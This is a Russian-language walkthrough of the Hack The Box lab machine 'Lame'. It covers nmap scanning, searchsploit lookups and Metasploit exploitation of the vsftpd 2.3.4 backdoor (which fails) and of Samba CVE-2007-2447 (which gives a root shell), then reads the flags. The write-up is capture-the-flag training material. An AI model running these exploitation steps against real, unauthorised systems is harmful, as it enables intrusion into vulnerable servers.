Для начала стоит просканировать nmap, выполнив команду

`nmap -sC -sV <ip> -oN <file>`

```
-sC - использование стандартных скриптов

-sV - обнаружение версий открытых портов

-oN - для вывода результатов сканирования в файл
```

Результат:
```
# Nmap 7.94SVN scan initiated Thu Apr 24 01:08:28 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN lame/nmap 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.069s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.20
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-04-24T01:09:47-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m36s, deviation: 2h50m00s, median: 23s
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 24 01:09:54 2025 -- 1 IP address (1 host up) scanned in 86.85 seconds

```

Теперь можно ответить на первые два вопроса:

**`How many of the `nmap` top 1000 TCP ports are open on the remote host?`**
- 4

**'What version of VSFTPd is running on Lame?'**
- 2.3.4

Для ответа на третий вопрос необходимо запустить метасплойт, найти и попытаться проэксплуатировать уязвимость для версии 2.3.4

С помощью `searchsploit` посмотрим какие есть уязвимости для `vsftpd`. Для версии 2.3.4 видим бэкдор `https://www.exploit-db.com/exploits/49757`.  (`searchsploit vsftpd 2.3.4 -w`)

![](../src/images/Pasted%20image%2020250424101511.png)

Из вывода nmap ранее мы видим что подключиться к 21 порту можно анонимно.

Попробуем проэксплуатировать данную уязвимость, для этого запускаем метасплойт командой `msfconfig` и ищем уязвимости `search vsftpd 2.3.4`. 

`msf6 > search vsftpd 2.3.4` - поиск уязвимостей
`msf6 > use 0` - выбор уязвимости
`msf6 > show options` - просмотр опций
`msf6 > set RHOST <ip>` -задание адреса атакуемой машины
`msf6 > run` - эксплуатация уязвимости

![](../src/images/Pasted%20image%2020250424102121.png)

Из вывода следует, что данная уязвимость недоступна.

**`There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?`**
- no

Для ответа на следующий вопрос, обратимся к выводу nmap 

**What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".**
- 3.0.20

Для ответа на следующий вопрос предлагаю еще раз воспользоваться `searchsloit`

`searchsploit samba 3.0.20`
`searchsploit -p 16320`

**What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the `SamrChangePassword` function when the "username map script" option is enabled in `smb.conf`?**
- CVE-2007-2447

![](../src/images/Pasted%20image%2020250424105000.png)

Данная уязвимость позволяет выполнить обратное подключение. 

Откроем metasploit и аналогичным способом как выше, попробуем проэксплуатировать уязвимость. На этот раз успех. 

выполним команду id или whoami, чтобы узнать под каким пользователем мы вошли.

**Exploiting CVE-2007-2447 returns a shell as which user?**
- root

В папке home видим пользователей, один из низ makis, у которого есть файл user.txt, прочитаем его.

`cat home/makis/user.txt`

Содержимое файла и будет ответом на вопрос **Submit the flag located in the makis user's home directory.**

Ответ на вопрос **Submit the flag located in root's home directory.**
находится по адресу root/root.txt

![](../src/images/Pasted%20image%2020250424133337.png)

На этом прохождение машины закончены, но остались еще вопросы. 

**We'll explore a bit beyond just getting a root shell on the box. While the official writeup doesn't cover this, you can look at [0xdf's write-up](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd) for more details. With a root shell, we can look at why the VSFTPd exploit failed. Our initial `nmap` scan showed four open TCP ports. Running `netstat -tnlp` shows many more ports listening, including ones on 0.0.0.0 and the boxes external IP, so they should be accessible. What must be blocking connection to these ports?**

Выполним данную команду `netstat -tnlp` и посмотрим сколько портов открыто. 

![](../src/images/Pasted%20image%2020250424134801.png)

Ответом на данный вопрос будет являться - firewall

**When the VSFTPd backdoor is trigger, what port starts listening?**
Для ответа на этот вопрос, посмотрим на нагрузку в CVE-2011-2523 (`https://www.exploit-db.com/exploits/49757`) - telnet запускается на порту 6200

**When the VSFTPd backdoor is triggered, does port 6200 start listening on Lame?**
Для этого надо выполнить команду `nc 127.0.0.1 6200`

Теперь порт 6200 должен отображаться как LISTEN